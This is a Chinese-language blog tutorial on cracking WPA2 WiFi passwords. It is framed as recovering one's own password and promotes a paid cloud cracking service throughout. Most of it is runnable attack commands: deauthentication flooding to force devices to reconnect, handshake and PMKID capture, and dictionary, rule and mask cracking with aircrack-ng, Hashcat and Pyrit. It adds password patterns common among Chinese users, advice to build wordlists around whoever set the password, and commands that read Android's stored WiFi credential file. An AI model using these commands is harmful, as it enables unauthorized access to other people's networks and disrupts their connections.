---
title: "WiFi密码忘了怎么找回？cap握手包破解教程（2026最新）"
date: 2026-05-18T10:00:00+08:00
draft: false
image: ""
keywords: "WiFi密码破解, cap文件破解, 握手包破解, WPA2密码恢复, aircrack-ng教程"
readingTime: true
categories: ['技术教程']
tags: ['WiFi', '网络安全', 'cap', 'WPA2', '密码恢复']
description: "忘记了自己的WiFi密码？本文教你如何通过抓取WPA2握手包（cap文件）并使用aircrack-ng、Hashcat等工具恢复WiFi密码，附完整命令行教程和实用技巧。"
---

> ⚠️ **免责声明**：本文仅用于恢复你自己拥有的 WiFi 网络密码。未经授权破解他人 WiFi 密码是违法行为，请勿用于非法用途。

## 前言

家里的 WiFi 密码设了太久没用忘记了？换了新手机想连 WiFi 却想不起密码？路由器管理页面也登不进去了？

对于使用 WPA/WPA2 加密的 WiFi 网络，密码不会以明文形式存储在路由器中。但好消息是，我们可以通过抓取 WiFi 的"握手包"（Handshake），然后使用密码恢复工具来找回丢失的密码。

## 基础知识：WPA2 握手包是什么？

### 四次握手（4-Way Handshake）

当设备（手机、电脑）连接 WPA2 WiFi 时，会和路由器进行一次"四次握手"过程：

```
客户端                          路由器
  |                               |
  |  1. ANonce (随机数A)         |
  |<------------------------------|
  |                               |
  |  2. SNonce (随机数B) + MIC   |
  |------------------------------>|
  |                               |
  |  3. GTK + MIC                 |
  |<------------------------------|
  |                               |
  |  4. 确认                      |
  |------------------------------>|
```

这个握手过程包含了用于推导 WiFi 密码的关键信息。抓到这四次握手的数据包（保存为 .cap 文件），就可以离线尝试恢复密码。

### 关键点

- **cap 文件不包含密码本身**，只包含验证密码是否正确的信息
- 需要至少一个设备在握手过程中在线（或手动触发重连）
- WPA2 的加密算法是 AES-CCMP，没有已知漏洞，只能通过穷举法恢复密码

## 第一步：抓取 WPA2 握手包

### 所需工具

- **硬件**：支持监听模式（Monitor Mode）的无线网卡
  - 推荐：Alfa AWUS036ACH、TP-Link TL-WN722N（V1）、Alfa AWUS036NHA
  - 注意：很多内置笔记本网卡不支持监听模式
- **软件**：[aircrack-ng](https://www.aircrack-ng.org/) 套件

### 安装 aircrack-ng

```bash
# Ubuntu/Debian
sudo apt install aircrack-ng

# macOS
brew install aircrack-ng

# Kali Linux（已预装）
```

### 抓取握手的完整流程

#### 1. 查看无线网卡并切换到监听模式

```bash
# 查看可用的无线网卡
iwconfig

# 假设网卡名称为 wlan0，先停止干扰进程
sudo airmon-ng check kill

# 切换到监听模式
sudo airmon-ng start wlan0

# 现在网卡名称变为 wlan0mon
```

#### 2. 扫描周围的 WiFi 网络

```bash
sudo airodump-ng wlan0mon
```

屏幕会显示：

```
BSSID              PWR  Beacons    #Data, #/s  CH   ENC    AUTH   CIPHER ESSID
AA:BB:CC:DD:EE:FF  -45      100       50    2   6   WPA2   PSK    CCMP   MyHomeWiFi
11:22:33:44:55:66  -67       80       20    1  11   WPA2   PSK    CCMP   Neighbor_WiFi
```

记住目标 WiFi 的 **BSSID**（MAC 地址）和 **CH**（信道）。

#### 3. 锁定目标网络并抓取握手包

```bash
# -w 指定保存文件名前缀
# --bssid 指定目标 BSSID
# -c 指定信道
sudo airodump-ng -w capture --bssid AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

#### 4. 触发设备重新握手

等待自然握手可能很慢，可以主动发送解除认证包（Deauth）来强制设备重新连接：

```bash
# 在另一个终端执行
# -0 5 表示发送 5 个 deauth 包
# -a 是路由器的 BSSID
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

当 airodump-ng 右上角显示 **"WPA handshake: AA:BB:CC:DD:EE:FF"** 时，说明握手包已成功抓取。

#### 5. 退出监听模式

```bash
sudo airmon-ng stop wlan0mon

# 恢复网络服务
sudo systemctl restart NetworkManager
```

此时你会得到一个 `capture-01.cap` 文件，这就是包含 WPA2 握手信息的数据包。

## 第二步：验证握手包是否完整

在开始破解前，确认 cap 文件包含完整的握手信息：

### 使用 aircrack-ng 验证

```bash
aircrack-ng capture-01.cap
```

如果输出中包含 "1 handshake"，说明握手包有效。

### 使用 tshark 详细查看

```bash
# 安装 Wireshark 命令行工具
sudo apt install tshark

# 查看握手包详情
tshark -r capture-01.cap -Y "eapol" -V
```

### 使用在线工具验证

你也可以将 cap 文件上传到 [catpasswd.com](https://www.catpasswd.com) 直接进行密码恢复，无需手动验证——系统会自动检测握手包的有效性。

## 第三步：破解 WiFi 密码

### 方法 1：aircrack-ng 字典攻击

最简单直接的方式：

```bash
# -w 指定字典文件
# -b 指定目标 BSSID
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

如果密码在字典中，输出类似：

```
                                 Aircrack-ng 1.7

      [00:02:35] 2847536/9822786 keys tested (19050.27 k/s)

      Time left: 6 minutes, 7 seconds                           28.98%

                           KEY FOUND! [ mypassword123 ]

      Master Key     : 4A 2B 3C 1D 5E 6F 7A 8B 9C 0D 1E 2F 3A 4B 5C 6D
                       7E 8F 9A 0B 1C 2D 3E 4F 5A 6B 7C 8D 9E 0F 1A 2B

      Transient Key  : ...
      EAPOL HMAC     : ...
```

### 方法 2：Hashcat GPU 加速（推荐，最快）

#### 转换 cap 文件为 Hashcat 格式

```bash
# 使用 hcxtools 转换
# 安装
sudo apt install hcxtools

# 转换为 .hc22000 格式
hcxpcapngtool -o wifi_hash.hc22000 capture-01.cap
```

#### 使用 Hashcat 破解

```bash
# WPA/WPA2 在 Hashcat 中的模式是 22000
hashcat -m 22000 -a 0 wifi_hash.hc22000 wordlist.txt

# 使用 GPU 加速，速度通常在 100K-500K/s（取决于显卡）
```

#### 常用攻击策略

```bash
# 字典攻击
hashcat -m 22000 -a 0 wifi_hash.hc22000 rockyou.txt

# 规则攻击（对字典中的密码做变形：加数字、改大小写等）
hashcat -m 22000 -a 0 wifi_hash.hc22000 rockyou.txt -r rules/best64.rule

# 掩码攻击（假设记得密码是 8 位小写字母+数字）
hashcat -m 22000 -a 3 wifi_hash.hc22000 "?l?l?l?l?l?l?d?d"

# 组合攻击
hashcat -m 22000 -a 1 wifi_hash.hc22000 wordlist1.txt wordlist2.txt
```

### 方法 3：Pyrit（专为 WPA 优化的工具）

[Pyrit](https://github.com/JPaulMora/Pyrit) 可以预计算 WPA 的 PMK（Pairwise Master Key），加速破解：

```bash
# 安装
pip install pyrit

# 导入字典
pyrit -r rockyou.txt import_passwords

# 导入 cap 文件
pyrit -r capture-01.cap import_capture

# 设置 ESSID
pyrit -e "MyHomeWiFi" create_essid

# 预计算 PMK（利用 GPU/CPU 加速）
pyrit batch

# 攻击
pyrit attack_db
```

### 方法 4：Python 脚本自己写

```python
from scapy.all import *
from hashlib import pbkdf2_hmac
import hmac, struct

def verify_wpa_password(cap_file, password, ssid):
    """验证一个密码是否是正确的 WPA2 密码"""
    
    # 从 cap 文件读取握手包
    packets = rdpcap(cap_file)
    
    # 计算 PMK (Pairwise Master Key)
    pmk = pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)
    
    print(f"测试密码: {password}")
    print(f"PMK: {pmk.hex()}")
    
    # 实际验证需要完整的握手数据和 PTK 推导
    # 这里简化展示，完整实现较复杂
    return pmk

# WiFi 密码通常是 8-63 位的 ASCII 字符
ssid = "MyHomeWiFi"
test_passwords = ["password123", "wifi1234", "home2024"]

for pwd in test_passwords:
    verify_wpa_password("capture-01.cap", pwd, ssid)
```

### 方法 5：云端在线恢复服务

如果不想自己配置环境或本地算力不足，可以把 cap 文件交给云端服务处理：

**[猫密网 (Catpasswd)](https://www.catpasswd.com)** 支持 WPA/WPA2 握手包（.cap 文件）的密码恢复。

#### 优势

- **无需安装 aircrack-ng 等工具**：直接上传 cap 文件即可
- **云端千万级字典**：覆盖了大量常见 WiFi 密码组合，包括：
  - 常见 WiFi 密码（如 12345678、88888888）
  - 手机号组合
  - 拼音 + 数字组合
  - 各地区的常见密码模式
- **分布式算力**：比单台电脑快数十倍
- **文件小**：cap 文件通常只有几 KB 到几 MB，上传很快

#### 使用流程

1. 按上面的步骤抓取握手包得到 .cap 文件
2. 访问 [猫密网](https://www.catpasswd.com) → [上传文件](https://www.catpasswd.com/recovery)
3. 上传 .cap 文件，填写邮箱
4. 系统自动分析握手包有效性并开始密码恢复
5. 成功后邮件通知

> 💡 **小技巧**：如果你不确定抓到的 cap 文件是否包含有效的握手数据，可以直接上传到猫密网，系统会自动检测。如果握手包无效，不会开始恢复也不会收费。

## 提高 WiFi 密码恢复成功率的技巧

### 1. 使用高质量 WiFi 专用字典

通用字典（如 rockyou.txt）的 WiFi 密码覆盖率不高。推荐使用专门的 WiFi 密码字典：

- **WiFi-Password-List**：GitHub 上有专门的 WiFi 常见密码合集
- **国内常见 WiFi 密码**：88888888、12345678、手机号后8位等
- **自定义字典**：根据你对设置者的了解生成可能的密码

### 2. 常见 WiFi 密码模式

中国人设置 WiFi 密码最常见的模式：

| 模式 | 示例 | 频率 |
|------|------|------|
| 8位纯数字 | 12345678、88888888 | ⭐⭐⭐⭐⭐ |
| 手机号 | 13812345678 | ⭐⭐⭐⭐ |
| 拼音+数字 | woaini520、zhangwei123 | ⭐⭐⭐ |
| 门牌号+楼号 | 1602dong、501hao | ⭐⭐ |
| 英文名+年份 | michael2020 | ⭐⭐ |

### 3. 利用规则攻击

```bash
# 创建一个规则文件 wifi.rule
cat > wifi.rule << 'EOF'
$1 $2 $3 $4 $5 $6 $7 $8
$8 $8 $8 $8 $8 $8 $8 $8
$1 $2 $3 $4 $5 $6 $7 $8 $9 $0
^[Ww]ifi
^$1$2$3$4
EOF

# 使用规则攻击
hashcat -m 22000 -a 0 wifi_hash.hc22000 common_words.txt -r wifi.rule
```

### 4. PMKID 攻击（无需握手的新方法）

WPA2 有一个较新的攻击向量——PMKID，不需要等待设备握手：

```bash
# 使用 hcxdumptool 抓取 PMKID
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# 等待几分钟，如果路由器支持 PMKID，会自动获取
# 然后转换并破解
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng
hashcat -m 22000 -a 0 pmkid.hc22000 wordlist.txt
```

**PMKID 的优势**：不需要有设备在线，只要路由器开着就行。

## 各方法对比

| 方法 | 速度 | 难度 | 需要 GPU | 适合场景 |
|------|------|------|---------|----------|
| aircrack-ng | 慢 | 中 | 否 | 简单字典攻击 |
| Hashcat | 极快 | 高 | 是 | 专业破解 |
| Pyrit | 快 | 中 | 可选 | PMK 预计算 |
| Python 脚本 | 慢 | 高 | 否 | 学习原理 |
| [猫密网](https://www.catpasswd.com) | 快 | 极低 | 否 | 普通用户 |

## 各品牌路由器能从管理页面查看密码吗？

如果你还能登录路由器管理页面，某些路由器可以直接查看 WiFi 密码：

| 品牌 | 管理页面地址 | 查看路径 |
|------|-------------|---------|
| TP-Link | 192.168.0.1 或 192.168.1.1 | 无线设置 → 无线安全设置 |
| 小米 | 192.168.31.1 | 常用设置 → WiFi 设置 |
| 华为 | 192.168.3.1 | 我的 WiFi → 查看密码 |
| 华硕 | 192.168.1.1 | 无线网络 → 一般设置 |
| OpenWrt | 192.168.1.1 | Network → Wireless → Edit |

> 💡 **小技巧**：即使管理页面密码显示为星号（***），也可以在浏览器开发者工具中查看明文。右键点击密码框 → 检查元素 → 将 `type="password"` 改为 `type="text"`。

## 常见问题

### Q: 抓到的 cap 文件显示"0 handshakes"怎么办？

说明没有抓到完整的四次握手。解决方法：
1. 确保有设备连接到目标 WiFi
2. 多发送几次 deauth 包强制重连
3. 尝试更长的抓取时间
4. 试试 PMKID 方法（不需要握手）

### Q: WPA3 能破解吗？

WPA3 大幅增强了安全性：
- 使用 SAE（Simultaneous Authentication of Equals）替代 PSK
- 防离线字典攻击
- 目前没有已知的有效破解方法

如果你的 WiFi 是 WPA3 加密，目前基本无法离线破解。

### Q: 内置笔记本网卡能抓握手包吗？

大多数内置网卡**不支持监听模式**，无法抓取握手包。建议购买支持监听模式的外置 USB 无线网卡（50-200 元），或直接使用 [猫密网](https://www.catpasswd.com) 上传已有的 cap 文件进行恢复。

### Q: 5GHz 和 2.4GHz 频段的 WiFi 抓包有区别吗？

抓取方法相同，但需要注意：
- 无线网卡必须支持对应频段
- 5GHz 的信道更多，扫描时间可能更长
- 部分双频路由器在不同频段使用相同密码，可以从任一频段抓取

### Q: 从手机上已经连接的 WiFi 能导出密码吗？

可以。已 root 的 Android 手机：
```bash
# WiFi 密码保存在以下文件中
cat /data/misc/wifi/WifiConfigStore.xml
# 或 Android 10+
cat /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml
```

iPhone 可以通过 iCloud 钥匙串同步，在 Mac 的"钥匙串访问"中查看。

## 安全防护建议

既然你了解了 WiFi 密码的破解方式，也应该知道如何保护自己的网络：

1. **使用 WPA3**：如果路由器支持，优先使用 WPA3 加密
2. **设置强密码**：12 位以上，混合大小写 + 数字 + 特殊字符
3. **禁用 WPS**：WPS 存在已知漏洞，容易被绕过
4. **关闭 PMKID**：在路由器设置中关闭（如果支持）
5. **定期更换密码**：尤其是当不信任的设备连接过你的网络时
6. **使用访客网络**：为访客设置独立的 WiFi 网络，与主网络隔离

## 总结

WiFi 密码恢复的核心步骤是：

1. **先检查路由器管理页面**：可能直接看到密码
2. **检查手机/电脑已保存的 WiFi 密码**：Android、iOS、Windows、macOS 都可以查看
3. **抓取握手包**：使用 aircrack-ng 套件
4. **破解密码**：Hashcat（最快）、aircrack-ng（最简单）、[猫密网](https://www.catpasswd.com)（最省心）

记住，本文所有方法仅限恢复自己拥有的 WiFi 网络密码。保护网络安全，从设置一个强密码开始。
